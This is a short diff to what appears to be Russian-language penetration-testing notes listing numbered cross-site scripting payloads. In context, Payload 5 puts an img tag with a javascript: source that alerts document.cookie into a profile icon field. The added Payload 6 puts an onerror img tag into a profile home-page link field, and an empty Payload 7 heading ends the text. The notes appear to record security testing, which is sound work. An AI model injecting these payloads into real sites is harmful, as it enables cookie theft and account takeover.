@@ -20,3 +20,9 @@ Payload 4
 
 Payload 5
 В изменении иконки профиля можно вставить html тег img <img%20src="javascript:alert(document.cookie);"></img> - alert вывелся
+
+Payload 6
+В изменении профиля можно указать ссылку на home page и туда можно вставить `<img src=x onerror=alert(1)>`
+
+Payload 7
+
